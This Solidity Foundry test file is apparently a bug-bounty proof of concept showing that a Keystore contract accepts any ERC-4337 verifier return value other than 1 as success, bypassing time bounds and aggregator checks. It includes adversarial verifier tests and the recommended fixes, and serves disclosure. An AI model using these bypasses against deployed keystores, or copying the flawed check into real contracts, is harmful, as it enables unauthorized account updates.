// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Keystore} from "../../src/core/Keystore.sol";
import {UpdateAction} from "../../src/lib/Actions.sol";
import {IVerifier} from "../../src/interface/IVerifier.sol";
import {SIG_VALIDATION_FAILED, SIG_VALIDATION_SUCCESS} from "account-abstraction/core/Helpers.sol";
import {
    ExpiredTimeBoundVerifier,
    NotYetValidVerifier,
    ArbitraryReturnVerifier,
    AggregatorAddressVerifier
} from "../mock/AdversarialVerifiers.sol";

/**
 * @title VerifierReturnValueBypass
 * @notice BOUNTY-GRADE PoC: ERC-4337 validationData semantics bypass
 *
 * VULNERABILITY SUMMARY:
 * Keystore._isSigValidationFailed() checks `return == SIG_VALIDATION_FAILED` (1)
 * instead of `return != SIG_VALIDATION_SUCCESS` (0). This means ANY return value
 * other than 1 is treated as SUCCESS, including:
 * - Packed time bounds (expired or not-yet-valid)
 * - Aggregator addresses (should require aggregator validation)
 * - Arbitrary non-standard values
 *
 * ERC-4337 validationData format (uint256):
 * - Bits 0-159: aggregator (0=success, 1=failure, other=use aggregator)
 * - Bits 160-207: validUntil (48 bits, 0 means infinite)
 * - Bits 208-255: validAfter (48 bits)
 *
 * IMPACT: Custom/malicious verifiers can bypass time-bound enforcement and
 * other ERC-4337 validation semantics by returning non-1 values.
 *
 * SEVERITY: Low-Medium (requires custom verifier, but defense-in-depth issue)
 */
contract VerifierReturnValueBypass is Test {
    Keystore keystore;

    address constant VICTIM = address(0xBEEF);
    bytes32 refHash;

    function setUp() public {
        keystore = new Keystore();
    }

    /**
     * @notice CORE EXPLOIT: Expired time bounds are accepted as success
     *
     * The verifier returns packed validationData where validUntil < block.timestamp
     * (i.e., the validation has expired). This SHOULD be rejected, but Keystore
     * accepts it because the return value is not exactly 1.
     */
    function test_ExpiredTimeBoundsAcceptedAsSuccess() public {
        // Warp to realistic timestamp (Dec 2025)
        vm.warp(1734300000);

        // Deploy malicious verifier that returns expired time bounds
        ExpiredTimeBoundVerifier maliciousVerifier = new ExpiredTimeBoundVerifier();

        // Create node with malicious verifier
        bytes memory node = abi.encodePacked(address(maliciousVerifier), VICTIM);
        bytes32 nodeHash = keccak256(node);
        refHash = nodeHash;

        // Register victim's node
        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(VICTIM);
        keystore.registerNode(refHash, emptyProof, node);

        // Capture initial state
        bytes32 initialRoot = keystore.getRootHash(refHash, VICTIM);
        console.log("Initial rootHash:", vm.toString(initialRoot));

        // What the verifier returns (for documentation)
        uint256 returnValue = maliciousVerifier.validateData(bytes32(0), "", "");
        console.log("");
        console.log("Verifier return value:", returnValue);
        console.log("Expected SUCCESS (0):", SIG_VALIDATION_SUCCESS);
        console.log("Expected FAILURE (1):", SIG_VALIDATION_FAILED);
        console.log("Is return == 1?", returnValue == SIG_VALIDATION_FAILED);
        console.log("Is return == 0?", returnValue == SIG_VALIDATION_SUCCESS);

        // Decode the return value to show it's expired
        _decodeAndLogValidationData(returnValue);

        // Execute update - should succeed because return != 1
        bytes32 nextHash = nodeHash; // Keep same node valid
        UpdateAction[] memory actions = _buildAction(refHash, nextHash, node);

        keystore.handleUpdates(actions);

        // Verify the update succeeded
        bytes32 newRoot = keystore.getRootHash(refHash, VICTIM);
        console.log("");
        console.log("=== RESULT ===");
        console.log("Update accepted:", newRoot == nextHash);
        console.log("New rootHash:", vm.toString(newRoot));

        // THE CRITICAL ASSERTION
        // Update succeeded even though time bounds were expired!
        assertEq(newRoot, nextHash, "EXPLOIT: Expired validation accepted as success");

        console.log("");
        console.log("IMPACT: Verifier with expired time bounds was accepted.");
        console.log("Keystore should reject, but only checks if return == 1.");
    }

    /**
     * @notice Future validAfter time bounds are accepted
     */
    function test_NotYetValidAcceptedAsSuccess() public {
        // Warp to realistic timestamp
        vm.warp(1734300000);

        NotYetValidVerifier maliciousVerifier = new NotYetValidVerifier();

        bytes memory node = abi.encodePacked(address(maliciousVerifier), VICTIM);
        bytes32 nodeHash = keccak256(node);
        refHash = nodeHash;

        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(VICTIM);
        keystore.registerNode(refHash, emptyProof, node);

        uint256 returnValue = maliciousVerifier.validateData(bytes32(0), "", "");
        console.log("=== NOT YET VALID TEST ===");
        console.log("Verifier return value:", returnValue);
        _decodeAndLogValidationData(returnValue);

        UpdateAction[] memory actions = _buildAction(refHash, nodeHash, node);
        keystore.handleUpdates(actions);

        bytes32 newRoot = keystore.getRootHash(refHash, VICTIM);
        assertEq(newRoot, nodeHash, "EXPLOIT: Not-yet-valid validation accepted");

        console.log("");
        console.log("IMPACT: Signature not yet valid was accepted.");
    }

    /**
     * @notice Arbitrary non-0, non-1 values are accepted as success
     */
    function test_ArbitraryReturnValueAcceptedAsSuccess() public {
        // Test various return values that should NOT be accepted
        uint256[] memory testValues = new uint256[](5);
        testValues[0] = 2;
        testValues[1] = 42;
        testValues[2] = type(uint256).max;
        testValues[3] = uint256(keccak256("random"));
        testValues[4] = 0xDEADBEEF;

        for (uint256 i = 0; i < testValues.length; i++) {
            _testArbitraryValue(testValues[i], i);
        }
    }

    function _testArbitraryValue(uint256 value, uint256 index) internal {
        ArbitraryReturnVerifier maliciousVerifier = new ArbitraryReturnVerifier(value);

        bytes memory node = abi.encodePacked(address(maliciousVerifier), VICTIM);
        bytes32 nodeHash = keccak256(node);

        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(VICTIM);
        keystore.registerNode(nodeHash, emptyProof, node);

        UpdateAction[] memory actions = _buildAction(nodeHash, nodeHash, node);
        keystore.handleUpdates(actions);

        bytes32 newRoot = keystore.getRootHash(nodeHash, VICTIM);
        assertEq(newRoot, nodeHash, string.concat("EXPLOIT: Arbitrary value ", vm.toString(value), " accepted"));

        console.log("Arbitrary value", value, "accepted as success");
    }

    /**
     * @notice Aggregator address return values are accepted without aggregator check
     */
    function test_AggregatorAddressAcceptedWithoutValidation() public {
        // In ERC-4337, returning a non-0 non-1 address means "use this aggregator"
        // Keystore doesn't implement aggregator validation, so it just accepts
        address fakeAggregator = address(0xA66E6A70);
        AggregatorAddressVerifier maliciousVerifier = new AggregatorAddressVerifier(fakeAggregator);

        bytes memory node = abi.encodePacked(address(maliciousVerifier), VICTIM);
        bytes32 nodeHash = keccak256(node);
        refHash = nodeHash;

        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(VICTIM);
        keystore.registerNode(refHash, emptyProof, node);

        uint256 returnValue = maliciousVerifier.validateData(bytes32(0), "", "");
        console.log("=== AGGREGATOR TEST ===");
        console.log("Return value (aggregator address as uint):", returnValue);
        console.log("Aggregator address:", address(uint160(returnValue)));

        UpdateAction[] memory actions = _buildAction(refHash, nodeHash, node);
        keystore.handleUpdates(actions);

        bytes32 newRoot = keystore.getRootHash(refHash, VICTIM);
        assertEq(newRoot, nodeHash, "EXPLOIT: Aggregator return accepted without aggregator validation");

        console.log("");
        console.log("IMPACT: Verifier claiming aggregator was accepted directly.");
        console.log("ERC-4337 spec requires additional aggregator validation.");
    }

    /**
     * @notice Fuzz test: Any return value != 1 is accepted
     */
    function testFuzz_AnyNonOneValueAccepted(uint256 returnValue) public {
        // Skip the actual failure value
        vm.assume(returnValue != SIG_VALIDATION_FAILED);
        // Skip 0 and 1 for this test (they're handled correctly)
        vm.assume(returnValue != SIG_VALIDATION_SUCCESS);

        ArbitraryReturnVerifier maliciousVerifier = new ArbitraryReturnVerifier(returnValue);

        bytes memory node = abi.encodePacked(address(maliciousVerifier), VICTIM);
        bytes32 nodeHash = keccak256(node);

        bytes32[] memory emptyProof = new bytes32[](0);
        vm.prank(VICTIM);
        keystore.registerNode(nodeHash, emptyProof, node);

        UpdateAction[] memory actions = _buildAction(nodeHash, nodeHash, node);
        keystore.handleUpdates(actions);

        bytes32 newRoot = keystore.getRootHash(nodeHash, VICTIM);
        // This should fail if the protocol properly rejects non-0 values
        // But it passes, proving the vulnerability
        assertEq(newRoot, nodeHash, "Non-1 return value was incorrectly accepted");
    }

    /**
     * @notice Document the recommended fix
     */
    function test_DocumentRecommendedFix() public pure {
        // CURRENT CODE (vulnerable):
        // return IVerifier(verifier).validateData(message, data, config) == SIG_VALIDATION_FAILED;

        // FIX OPTION 1: Strict success check
        // return IVerifier(verifier).validateData(message, data, config) != SIG_VALIDATION_SUCCESS;

        // FIX OPTION 2: Decode and enforce time bounds
        // uint256 result = IVerifier(verifier).validateData(message, data, config);
        // (address aggregator, uint48 validAfter, uint48 validUntil) = _parseValidationData(result);
        // if (aggregator == address(1)) return true; // Explicit failure
        // if (aggregator != address(0)) return true; // Aggregator not supported
        // if (block.timestamp < validAfter) return true; // Not yet valid
        // if (validUntil != 0 && block.timestamp > validUntil) return true; // Expired
        // return false; // Success

        // RECOMMENDATION: Option 1 is simplest and most secure
        // Option 2 only if time-bound support is required
    }

    /*//////////////////////////////////////////////////////////////
                            HELPER FUNCTIONS
    //////////////////////////////////////////////////////////////*/

    function _buildAction(bytes32 _refHash, bytes32 _nextHash, bytes memory _node)
        internal
        view
        returns (UpdateAction[] memory)
    {
        bytes32[] memory emptyProof = new bytes32[](0);
        UpdateAction[] memory actions = new UpdateAction[](1);
        actions[0] = UpdateAction({
            refHash: _refHash,
            nextHash: _nextHash,
            nonce: 0,
            useChainId: true,
            account: VICTIM,
            proof: abi.encode(emptyProof),
            node: _node,
            data: "", // No signature needed - malicious verifier always returns success
            nextProof: abi.encode(emptyProof),
            nextNode: "",
            nextData: ""
        });
        return actions;
    }

    function _decodeAndLogValidationData(uint256 validationData) internal view {
        // ERC-4337 validationData decoding
        address aggregator = address(uint160(validationData));
        uint48 validUntil = uint48(validationData >> 160);
        uint48 validAfter = uint48(validationData >> 208);

        if (validUntil == 0) validUntil = type(uint48).max; // 0 means infinite

        console.log("");
        console.log("Decoded validationData:");
        console.log("  aggregator:", aggregator);
        console.log("  validUntil:", validUntil);
        console.log("  validAfter:", validAfter);
        console.log("  current timestamp:", block.timestamp);

        if (block.timestamp > validUntil) {
            console.log("  STATUS: EXPIRED (should be rejected!)");
        } else if (block.timestamp < validAfter) {
            console.log("  STATUS: NOT YET VALID (should be rejected!)");
        } else {
            console.log("  STATUS: Within valid time window");
        }
    }
}

